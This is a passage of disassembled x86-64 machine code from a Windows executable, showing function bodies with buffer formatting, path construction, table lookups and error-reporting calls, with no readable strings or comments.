   140003cb9:	41 5c                	pop    %r12
   140003cbb:	5f                   	pop    %rdi
   140003cbc:	c3                   	ret
   140003cbd:	48 8b cf             	mov    %rdi,%rcx
   140003cc0:	e8 9b 4b 00 00       	call   0x140008860
   140003cc5:	85 c0                	test   %eax,%eax
   140003cc7:	79 09                	jns    0x140003cd2
   140003cc9:	48 8d 0d 08 94 02 00 	lea    0x29408(%rip),%rcx        # 0x14002d0d8
   140003cd0:	eb 9e                	jmp    0x140003c70
   140003cd2:	48 8d af 22 20 00 00 	lea    0x2022(%rdi),%rbp
   140003cd9:	e9 b3 00 00 00       	jmp    0x140003d91
   140003cde:	48 8d 0d fb 92 02 00 	lea    0x292fb(%rip),%rcx        # 0x14002cfe0
   140003ce5:	e8 46 4d 00 00       	call   0x140008a30
   140003cea:	48 8b d8             	mov    %rax,%rbx
   140003ced:	48 85 c0             	test   %rax,%rax
   140003cf0:	74 4d                	je     0x140003d3f
   140003cf2:	80 38 00             	cmpb   $0x0,(%rax)
   140003cf5:	74 48                	je     0x140003d3f
   140003cf7:	48 8d af 22 20 00 00 	lea    0x2022(%rdi),%rbp
   140003cfe:	4c 8b c8             	mov    %rax,%r9
   140003d01:	48 8b cd             	mov    %rbp,%rcx
   140003d04:	4c 8d 05 81 8d 02 00 	lea    0x28d81(%rip),%r8        # 0x14002ca8c
   140003d0b:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d10:	e8 6b df ff ff       	call   0x140001c80
   140003d15:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003d1a:	7c 19                	jl     0x140003d35
   140003d1c:	48 8d 0d 1d 94 02 00 	lea    0x2941d(%rip),%rcx        # 0x14002d140
   140003d23:	e8 e8 e9 ff ff       	call   0x140002710
   140003d28:	48 8b cb             	mov    %rbx,%rcx
   140003d2b:	e8 d0 14 01 00       	call   0x140015200
   140003d30:	e9 40 ff ff ff       	jmp    0x140003c75
   140003d35:	48 8b cb             	mov    %rbx,%rcx
   140003d38:	e8 c3 14 01 00       	call   0x140015200
   140003d3d:	eb 52                	jmp    0x140003d91
   140003d3f:	48 8d 0d ba 93 02 00 	lea    0x293ba(%rip),%rcx        # 0x14002d100
   140003d46:	e9 25 ff ff ff       	jmp    0x140003c70
   140003d4b:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003d4f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003d54:	e8 97 07 00 00       	call   0x1400044f0
   140003d59:	4c 8b 87 70 30 00 00 	mov    0x3070(%rdi),%r8
   140003d60:	48 8d af 22 20 00 00 	lea    0x2022(%rdi),%rbp
   140003d67:	48 8b cd             	mov    %rbp,%rcx
   140003d6a:	4d 85 c0             	test   %r8,%r8
   140003d6d:	74 0c                	je     0x140003d7b
   140003d6f:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003d74:	e8 c7 08 00 00       	call   0x140004640
   140003d79:	eb 16                	jmp    0x140003d91
   140003d7b:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003d80:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d85:	4c 8d 05 00 8d 02 00 	lea    0x28d00(%rip),%r8        # 0x14002ca8c
   140003d8c:	e8 ef de ff ff       	call   0x140001c80
   140003d91:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003d98:	74 54                	je     0x140003dee
   140003d9a:	41 80 3f 00          	cmpb   $0x0,(%r15)
   140003d9e:	75 4e                	jne    0x140003dee
   140003da0:	48 8d 05 c1 93 02 00 	lea    0x293c1(%rip),%rax        # 0x14002d168
   140003da7:	33 c9                	xor    %ecx,%ecx
   140003da9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003dae:	48 8d 05 db 93 02 00 	lea    0x293db(%rip),%rax        # 0x14002d190
   140003db5:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003dba:	ff 15 28 83 02 00    	call   *0x28328(%rip)        # 0x14002c0e8
   140003dc0:	33 c0                	xor    %eax,%eax
   140003dc2:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   140003dc7:	8b d8                	mov    %eax,%ebx
   140003dc9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003dd0:	48 8b 0e             	mov    (%rsi),%rcx
   140003dd3:	33 d2                	xor    %edx,%edx
   140003dd5:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003ddb:	ff 15 ff 82 02 00    	call   *0x282ff(%rip)        # 0x14002c0e0
   140003de1:	ff c3                	inc    %ebx
   140003de3:	48 8d 76 08          	lea    0x8(%rsi),%rsi
   140003de7:	83 fb 02             	cmp    $0x2,%ebx
   140003dea:	72 e4                	jb     0x140003dd0
   140003dec:	33 f6                	xor    %esi,%esi
   140003dee:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003df4:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003df9:	48 8b cd             	mov    %rbp,%rcx
   140003dfc:	e8 0f 56 00 00       	call   0x140009410
   140003e01:	48 85 c0             	test   %rax,%rax
   140003e04:	75 0c                	jne    0x140003e12
   140003e06:	48 8d 0d ab 93 02 00 	lea    0x293ab(%rip),%rcx        # 0x14002d1b8
   140003e0d:	e9 5e fe ff ff       	jmp    0x140003c70
   140003e12:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003e17:	ff 15 cb 82 02 00    	call   *0x282cb(%rip)        # 0x14002c0e8
   140003e1d:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003e24:	32 db                	xor    %bl,%bl
   140003e26:	48 83 b8 20 10 00 00 	cmpq   $0x0,0x1020(%rax)
   140003e2d:	00 
   140003e2e:	0f 84 f7 00 00 00    	je     0x140003f2b
   140003e34:	48 8d 0d 15 94 02 00 	lea    0x29415(%rip),%rcx        # 0x14002d250
   140003e3b:	e8 f0 4b 00 00       	call   0x140008a30
   140003e40:	48 85 c0             	test   %rax,%rax
   140003e43:	74 17                	je     0x140003e5c
   140003e45:	0f b6 10             	movzbl (%rax),%edx
   140003e48:	83 ea 31             	sub    $0x31,%edx
   140003e4b:	75 0a                	jne    0x140003e57
   140003e4d:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003e51:	40 0f b6 ce          	movzbl %sil,%ecx
   140003e55:	2b d1                	sub    %ecx,%edx
   140003e57:	85 d2                	test   %edx,%edx
   140003e59:	0f 94 c3             	sete   %bl
   140003e5c:	48 8b c8             	mov    %rax,%rcx
   140003e5f:	e8 9c 13 01 00       	call   0x140015200
   140003e64:	84 db                	test   %bl,%bl
   140003e66:	0f 85 b0 00 00 00    	jne    0x140003f1c
   140003e6c:	41 0f b6 07          	movzbl (%r15),%eax
   140003e70:	3c 02                	cmp    $0x2,%al
   140003e72:	0f 83 a4 00 00 00    	jae    0x140003f1c
   140003e78:	38 9f 20 20 00 00    	cmp    %bl,0x2020(%rdi)
   140003e7e:	74 09                	je     0x140003e89
   140003e80:	84 c0                	test   %al,%al
   140003e82:	74 0d                	je     0x140003e91
   140003e84:	e9 a2 00 00 00       	jmp    0x140003f2b
   140003e89:	3c 01                	cmp    $0x1,%al
   140003e8b:	0f 85 9a 00 00 00    	jne    0x140003f2b
   140003e91:	e8 2a 2f 00 00       	call   0x140006dc0
   140003e96:	48 8d 9f 18 20 00 00 	lea    0x2018(%rdi),%rbx
   140003e9d:	48 8b d7             	mov    %rdi,%rdx
   140003ea0:	48 8b c8             	mov    %rax,%rcx
   140003ea3:	48 89 03             	mov    %rax,(%rbx)
   140003ea6:	e8 95 34 00 00       	call   0x140007340
   140003eab:	85 c0                	test   %eax,%eax
   140003ead:	74 09                	je     0x140003eb8
   140003eaf:	48 8d 0d c2 93 02 00 	lea    0x293c2(%rip),%rcx        # 0x14002d278
   140003eb6:	eb 4d                	jmp    0x140003f05
   140003eb8:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003ebf:	74 18                	je     0x140003ed9
   140003ec1:	48 8b 0b             	mov    (%rbx),%rcx
   140003ec4:	48 8b d7             	mov    %rdi,%rdx
   140003ec7:	e8 34 2f 00 00       	call   0x140006e00
   140003ecc:	85 c0                	test   %eax,%eax
   140003ece:	74 09                	je     0x140003ed9
   140003ed0:	48 8d 0d d1 93 02 00 	lea    0x293d1(%rip),%rcx        # 0x14002d2a8
   140003ed7:	eb 2c                	jmp    0x140003f05
   140003ed9:	48 8b 0b             	mov    (%rbx),%rcx
   140003edc:	e8 cf 32 00 00       	call   0x1400071b0
   140003ee1:	85 c0                	test   %eax,%eax
   140003ee3:	74 09                	je     0x140003eee
   140003ee5:	48 8d 0d fc 93 02 00 	lea    0x293fc(%rip),%rcx        # 0x14002d2e8
   140003eec:	eb 17                	jmp    0x140003f05
   140003eee:	48 8b 0b             	mov    (%rbx),%rcx
   140003ef1:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003ef5:	e8 f6 35 00 00       	call   0x1400074f0
   140003efa:	85 c0                	test   %eax,%eax
   140003efc:	74 2d                	je     0x140003f2b
   140003efe:	48 8d 0d 23 94 02 00 	lea    0x29423(%rip),%rcx        # 0x14002d328
   140003f05:	e8 46 eb ff ff       	call   0x140002a50
   140003f0a:	48 8b 0b             	mov    (%rbx),%rcx
   140003f0d:	e8 ae 30 00 00       	call   0x140006fc0
   140003f12:	48 8b cb             	mov    %rbx,%rcx
   140003f15:	e8 56 2e 00 00       	call   0x140006d70
   140003f1a:	eb 0f                	jmp    0x140003f2b
   140003f1c:	49 8b d5             	mov    %r13,%rdx
   140003f1f:	48 8d 0d fa 90 02 00 	lea    0x290fa(%rip),%rcx        # 0x14002d020
   140003f26:	e8 15 4c 00 00       	call   0x140008b40
   140003f2b:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003f32:	0f 84 f0 00 00 00    	je     0x140004028
   140003f38:	80 bf 21 20 00 00 00 	cmpb   $0x0,0x2021(%rdi)
   140003f3f:	0f 85 e3 00 00 00    	jne    0x140004028
   140003f45:	48 8b cf             	mov    %rdi,%rcx
   140003f48:	e8 73 f4 ff ff       	call   0x1400033c0
   140003f4d:	85 c0                	test   %eax,%eax
   140003f4f:	0f 88 20 fd ff ff    	js     0x140003c75
   140003f55:	48 8d 8f 38 30 00 00 	lea    0x3038(%rdi),%rcx
   140003f5c:	e8 6f 51 00 00       	call   0x1400090d0
   140003f61:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140003f68:	00 
   140003f69:	75 23                	jne    0x140003f8e
   140003f6b:	45 33 c9             	xor    %r9d,%r9d
   140003f6e:	45 33 c0             	xor    %r8d,%r8d
   140003f71:	33 d2                	xor    %edx,%edx
   140003f73:	33 c9                	xor    %ecx,%ecx
   140003f75:	ff 15 9d 84 02 00    	call   *0x2849d(%rip)        # 0x14002c418
   140003f7b:	45 33 c9             	xor    %r9d,%r9d
   140003f7e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f83:	45 33 c0             	xor    %r8d,%r8d
   140003f86:	33 d2                	xor    %edx,%edx
   140003f88:	ff 15 92 84 02 00    	call   *0x28492(%rip)        # 0x14002c420
   140003f8e:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003f95:	48 8d 0d 44 90 02 00 	lea    0x29044(%rip),%rcx        # 0x14002cfe0
   140003f9c:	e8 9f 4b 00 00       	call   0x140008b40
   140003fa1:	48 8b cf             	mov    %rdi,%rcx
   140003fa4:	e8 37 4c 00 00       	call   0x140008be0
   140003fa9:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   140003fb0:	8b f0                	mov    %eax,%esi
   140003fb2:	e8 09 30 00 00       	call   0x140006fc0
   140003fb7:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140003fbe:	e8 ad 2d 00 00       	call   0x140006d70
   140003fc3:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140003fca:	e8 11 4b 00 00       	call   0x140008ae0
   140003fcf:	85 c0                	test   %eax,%eax
   140003fd1:	79 41                	jns    0x140004014
   140003fd3:	48 8b cf             	mov    %rdi,%rcx
   140003fd6:	e8 35 52 00 00       	call   0x140009210
   140003fdb:	85 c0                	test   %eax,%eax
   140003fdd:	79 35                	jns    0x140004014
   140003fdf:	80 bf 31 30 00 00 00 	cmpb   $0x0,0x3031(%rdi)
   140003fe6:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003fed:	48 8d 0d 54 93 02 00 	lea    0x29354(%rip),%rcx        # 0x14002d348
   140003ff4:	74 19                	je     0x14000400f
   140003ff6:	e8 15 e7 ff ff       	call   0x140002710
   140003ffb:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140004002:	e8 f9 d8 ff ff       	call   0x140001900
   140004007:	41 8b f6             	mov    %r14d,%esi
   14000400a:	e9 66 fc ff ff       	jmp    0x140003c75
   14000400f:	e8 3c ea ff ff       	call   0x140002a50
   140004014:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   14000401b:	e8 e0 d8 ff ff       	call   0x140001900
   140004020:	44 8b f6             	mov    %esi,%r14d
   140004023:	e9 4d fc ff ff       	jmp    0x140003c75
   140004028:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   14000402f:	00 
   140004030:	75 23                	jne    0x140004055
   140004032:	45 33 c9             	xor    %r9d,%r9d
   140004035:	45 33 c0             	xor    %r8d,%r8d
   140004038:	33 d2                	xor    %edx,%edx
   14000403a:	33 c9                	xor    %ecx,%ecx
   14000403c:	ff 15 d6 83 02 00    	call   *0x283d6(%rip)        # 0x14002c418
   140004042:	45 33 c9             	xor    %r9d,%r9d
   140004045:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000404a:	45 33 c0             	xor    %r8d,%r8d
   14000404d:	33 d2                	xor    %edx,%edx
   14000404f:	ff 15 cb 83 02 00    	call   *0x283cb(%rip)        # 0x14002c420
   140004055:	48 8b cf             	mov    %rdi,%rcx
   140004058:	e8 43 f6 ff ff       	call   0x1400036a0
   14000405d:	48 8b cf             	mov    %rdi,%rcx
   140004060:	e8 fb f2 ff ff       	call   0x140003360
   140004065:	48 8b cf             	mov    %rdi,%rcx
   140004068:	8b d8                	mov    %eax,%ebx
   14000406a:	e8 01 f6 ff ff       	call   0x140003670
   14000406f:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   140004076:	e8 45 2f 00 00       	call   0x140006fc0
   14000407b:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140004082:	e8 e9 2c 00 00       	call   0x140006d70
   140004087:	8b c3                	mov    %ebx,%eax
   140004089:	e9 ea fb ff ff       	jmp    0x140003c78
   14000408e:	cc                   	int3
   14000408f:	cc                   	int3
   140004090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004095:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000409a:	57                   	push   %rdi
   14000409b:	48 83 ec 20          	sub    $0x20,%rsp
   14000409f:	48 8b f9             	mov    %rcx,%rdi
   1400040a2:	33 f6                	xor    %esi,%esi
   1400040a4:	48 8b 89 18 20 00 00 	mov    0x2018(%rcx),%rcx
   1400040ab:	e8 10 2f 00 00       	call   0x140006fc0
   1400040b0:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   1400040b7:	e8 b4 2c 00 00       	call   0x140006d70
   1400040bc:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400040c3:	e8 18 4a 00 00       	call   0x140008ae0
   1400040c8:	85 c0                	test   %eax,%eax
   1400040ca:	79 34                	jns    0x140004100
   1400040cc:	48 8b cf             	mov    %rdi,%rcx
   1400040cf:	e8 3c 51 00 00       	call   0x140009210
   1400040d4:	85 c0                	test   %eax,%eax
   1400040d6:	79 28                	jns    0x140004100
   1400040d8:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   1400040df:	48 8d 0d 62 92 02 00 	lea    0x29262(%rip),%rcx        # 0x14002d348
   1400040e6:	40 38 b7 31 30 00 00 	cmp    %sil,0x3031(%rdi)
   1400040ed:	74 0c                	je     0x1400040fb
   1400040ef:	e8 1c e6 ff ff       	call   0x140002710
   1400040f4:	be ff ff ff ff       	mov    $0xffffffff,%esi
   1400040f9:	eb 05                	jmp    0x140004100
   1400040fb:	e8 50 e9 ff ff       	call   0x140002a50
   140004100:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140004107:	e8 f4 d7 ff ff       	call   0x140001900
   14000410c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004111:	8b c6                	mov    %esi,%eax
   140004113:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004118:	48 83 c4 20          	add    $0x20,%rsp
   14000411c:	5f                   	pop    %rdi
   14000411d:	c3                   	ret
   14000411e:	cc                   	int3
   14000411f:	cc                   	int3
   140004120:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004125:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000412a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000412f:	53                   	push   %rbx
   140004130:	56                   	push   %rsi
   140004131:	57                   	push   %rdi
   140004132:	48 83 ec 30          	sub    $0x30,%rsp
   140004136:	48 8b da             	mov    %rdx,%rbx
   140004139:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000413e:	48 8b f9             	mov    %rcx,%rdi
   140004141:	e8 fa ce ff ff       	call   0x140001040
   140004146:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000414b:	4c 8b cb             	mov    %rbx,%r9
   14000414e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004154:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000415b:	00 00 
   14000415d:	48 8b d7             	mov    %rdi,%rdx
   140004160:	48 8b 08             	mov    (%rax),%rcx
   140004163:	48 83 c9 02          	or     $0x2,%rcx
   140004167:	e8 68 0a 01 00       	call   0x140014bd4
   14000416c:	85 c0                	test   %eax,%eax
   14000416e:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004173:	0f 48 c1             	cmovs  %ecx,%eax
   140004176:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000417b:	7c 0a                	jl     0x140004187
   14000417d:	8b c1                	mov    %ecx,%eax
   14000417f:	48 83 c4 30          	add    $0x30,%rsp
   140004183:	5f                   	pop    %rdi
   140004184:	5e                   	pop    %rsi
   140004185:	5b                   	pop    %rbx
   140004186:	c3                   	ret
   140004187:	48 8b cf             	mov    %rdi,%rcx
   14000418a:	e8 e1 03 00 00       	call   0x140004570
   14000418f:	48 83 c4 30          	add    $0x30,%rsp
   140004193:	5f                   	pop    %rdi
   140004194:	5e                   	pop    %rsi
   140004195:	5b                   	pop    %rbx
   140004196:	c3                   	ret
   140004197:	cc                   	int3
   140004198:	cc                   	int3
   140004199:	cc                   	int3
   14000419a:	cc                   	int3
   14000419b:	cc                   	int3
   14000419c:	cc                   	int3
   14000419d:	cc                   	int3
   14000419e:	cc                   	int3
   14000419f:	cc                   	int3
   1400041a0:	40 53                	rex push %rbx
   1400041a2:	55                   	push   %rbp
   1400041a3:	56                   	push   %rsi
   1400041a4:	57                   	push   %rdi
   1400041a5:	41 56                	push   %r14
   1400041a7:	b8 60 40 00 00       	mov    $0x4060,%eax
   1400041ac:	e8 1f 87 00 00       	call   0x14000c8d0
   1400041b1:	48 2b e0             	sub    %rax,%rsp
   1400041b4:	48 8b 05 85 ae 03 00 	mov    0x3ae85(%rip),%rax        # 0x14003f040
   1400041bb:	48 33 c4             	xor    %rsp,%rax
   1400041be:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   1400041c5:	00 
   1400041c6:	4c 8b b4 24 b0 40 00 	mov    0x40b0(%rsp),%r14
   1400041cd:	00 
   1400041ce:	48 8b f2             	mov    %rdx,%rsi
   1400041d1:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   1400041d5:	48 8b d9             	mov    %rcx,%rbx
   1400041d8:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   1400041df:	00 
   1400041e0:	49 8b e9             	mov    %r9,%rbp
   1400041e3:	49 8b f8             	mov    %r8,%rdi
   1400041e6:	e8 05 03 00 00       	call   0x1400044f0
   1400041eb:	48 8b d7             	mov    %rdi,%rdx
   1400041ee:	48 8d 8c 24 50 30 00 	lea    0x3050(%rsp),%rcx
   1400041f5:	00 
   1400041f6:	e8 f5 02 00 00       	call   0x1400044f0
   1400041fb:	48 8b 83 70 30 00 00 	mov    0x3070(%rbx),%rax
   140004202:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140004209:	00 
   14000420a:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004211:	00 
   140004212:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140004218:	48 85 c0             	test   %rax,%rax
   14000421b:	74 2f                	je     0x14000424c
   14000421d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004222:	48 8d 15 77 93 02 00 	lea    0x29377(%rip),%rdx        # 0x14002d5a0
   140004229:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   14000422e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004233:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   14000423a:	00 
   14000423b:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140004240:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004245:	e8 d6 fe ff ff       	call   0x140004120
   14000424a:	eb 26                	jmp    0x140004272
   14000424c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140004251:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   140004258:	00 
   140004259:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
   140004260:	00 
   140004261:	48 8d 15 48 93 02 00 	lea    0x29348(%rip),%rdx        # 0x14002d5b0
   140004268:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000426d:	e8 ae fe ff ff       	call   0x140004120
   140004272:	83 f8 01             	cmp    $0x1,%eax
   140004275:	75 35                	jne    0x1400042ac
   140004277:	49 8b d6             	mov    %r14,%rdx
   14000427a:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004281:	00 
   140004282:	e8 69 3a 00 00       	call   0x140007cf0
   140004287:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000428a:	0f 85 7a 01 00 00    	jne    0x14000440a
   140004290:	4c 8d 84 24 50 20 00 	lea    0x2050(%rsp),%r8
   140004297:	00 
   140004298:	48 8b d5             	mov    %rbp,%rdx
   14000429b:	48 8d 0d 1e 93 02 00 	lea    0x2931e(%rip),%rcx        # 0x14002d5c0
   1400042a2:	e8 69 e4 ff ff       	call   0x140002710
   1400042a7:	e9 84 01 00 00       	jmp    0x140004430
   1400042ac:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042b2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042b7:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042be:	00 
   1400042bf:	48 8d 15 22 93 02 00 	lea    0x29322(%rip),%rdx        # 0x14002d5e8
   1400042c6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042cb:	e8 50 fe ff ff       	call   0x140004120
   1400042d0:	83 f8 01             	cmp    $0x1,%eax
   1400042d3:	74 61                	je     0x140004336
   1400042d5:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042db:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042e0:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042e7:	00 
   1400042e8:	48 8d 15 09 93 02 00 	lea    0x29309(%rip),%rdx        # 0x14002d5f8
   1400042ef:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042f4:	e8 27 fe ff ff       	call   0x140004120
   1400042f9:	83 f8 01             	cmp    $0x1,%eax
   1400042fc:	74 38                	je     0x140004336
   1400042fe:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140004304:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004309:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140004310:	00 
   140004311:	48 8d 15 5c 8a 02 00 	lea    0x28a5c(%rip),%rdx        # 0x14002cd74
   140004318:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000431d:	e8 fe fd ff ff       	call   0x140004120
   140004322:	83 f8 01             	cmp    $0x1,%eax
   140004325:	74 0f                	je     0x140004336
   140004327:	48 8b d7             	mov    %rdi,%rdx
   14000432a:	48 8d 0d d7 92 02 00 	lea    0x292d7(%rip),%rcx        # 0x14002d608
   140004331:	e9 f5 00 00 00       	jmp    0x14000442b
   140004336:	48 8b 1e             	mov    (%rsi),%rbx
   140004339:	33 ff                	xor    %edi,%edi
   14000433b:	48 85 db             	test   %rbx,%rbx
   14000433e:	74 63                	je     0x1400043a3
   140004340:	44 8b cf             	mov    %edi,%r9d
   140004343:	0f 1f 40 00          	nopl   0x0(%rax)
   140004347:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000434e:	00 00 
   140004350:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004355:	48 8b c3             	mov    %rbx,%rax
   140004358:	4c 2b c3             	sub    %rbx,%r8
   14000435b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004360:	0f b6 10             	movzbl (%rax),%edx
   140004363:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140004368:	2b d1                	sub    %ecx,%edx
   14000436a:	75 07                	jne    0x140004373
   14000436c:	48 ff c0             	inc    %rax
   14000436f:	85 c9                	test   %ecx,%ecx
   140004371:	75 ed                	jne    0x140004360
   140004373:	85 d2                	test   %edx,%edx
   140004375:	74 25                	je     0x14000439c
   140004377:	4a 8b 5c ce 08       	mov    0x8(%rsi,%r9,8),%rbx
   14000437c:	49 ff c1             	inc    %r9
   14000437f:	ff c7                	inc    %edi
   140004381:	48 85 db             	test   %rbx,%rbx
   140004384:	75 ca                	jne    0x140004350
   140004386:	83 ff 14             	cmp    $0x14,%edi
   140004389:	7c 18                	jl     0x1400043a3
   14000438b:	48 8d 0d c6 91 02 00 	lea    0x291c6(%rip),%rcx        # 0x14002d558
   140004392:	e8 79 e3 ff ff       	call   0x140002710
   140004397:	e9 83 00 00 00       	jmp    0x14000441f
   14000439c:	48 85 db             	test   %rbx,%rbx
   14000439f:	75 1b                	jne    0x1400043bc
   1400043a1:	eb 7c                	jmp    0x14000441f
   1400043a3:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400043a8:	e8 a3 d5 ff ff       	call   0x140001950
   1400043ad:	48 8b d8             	mov    %rax,%rbx
   1400043b0:	48 85 c0             	test   %rax,%rax
   1400043b3:	74 59                	je     0x14000440e
   1400043b5:	48 63 c7             	movslq %edi,%rax
   1400043b8:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   1400043bc:	48 8b d5             	mov    %rbp,%rdx
   1400043bf:	48 8b cb             	mov    %rbx,%rcx
   1400043c2:	e8 79 d4 ff ff       	call   0x140001840
   1400043c7:	48 85 c0             	test   %rax,%rax
   1400043ca:	75 16                	jne    0x1400043e2
   1400043cc:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043d1:	48 8b d5             	mov    %rbp,%rdx
   1400043d4:	48 8d 0d 95 92 02 00 	lea    0x29295(%rip),%rcx        # 0x14002d670
   1400043db:	e8 30 e3 ff ff       	call   0x140002710
   1400043e0:	eb 4e                	jmp    0x140004430
   1400043e2:	4d 8b c6             	mov    %r14,%r8
   1400043e5:	48 8b d0             	mov    %rax,%rdx
   1400043e8:	48 8b cb             	mov    %rbx,%rcx
   1400043eb:	e8 10 d2 ff ff       	call   0x140001600
   1400043f0:	85 c0                	test   %eax,%eax
   1400043f2:	79 16                	jns    0x14000440a
   1400043f4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043f9:	48 8b d5             	mov    %rbp,%rdx
   1400043fc:	48 8d 0d ad 92 02 00 	lea    0x292ad(%rip),%rcx        # 0x14002d6b0
   140004403:	e8 08 e3 ff ff       	call   0x140002710
   140004408:	eb 26                	jmp    0x140004430
   14000440a:	33 c0                	xor    %eax,%eax
   14000440c:	eb 27                	jmp    0x140004435
   14000440e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004413:	48 8d 0d 66 91 02 00 	lea    0x29166(%rip),%rcx        # 0x14002d580
   14000441a:	e8 f1 e2 ff ff       	call   0x140002710
   14000441f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004424:	48 8d 0d 0d 92 02 00 	lea    0x2920d(%rip),%rcx        # 0x14002d638
   14000442b:	e8 e0 e2 ff ff       	call   0x140002710
   140004430:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004435:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   14000443c:	00 
   14000443d:	48 33 cc             	xor    %rsp,%rcx
   140004440:	e8 8b 81 00 00       	call   0x14000c5d0
   140004445:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   14000444c:	41 5e                	pop    %r14
   14000444e:	5f                   	pop    %rdi
   14000444f:	5e                   	pop    %rsi
   140004450:	5d                   	pop    %rbp
   140004451:	5b                   	pop    %rbx
   140004452:	c3                   	ret
   140004453:	cc                   	int3
   140004454:	cc                   	int3
   140004455:	cc                   	int3
   140004456:	cc                   	int3
   140004457:	cc                   	int3
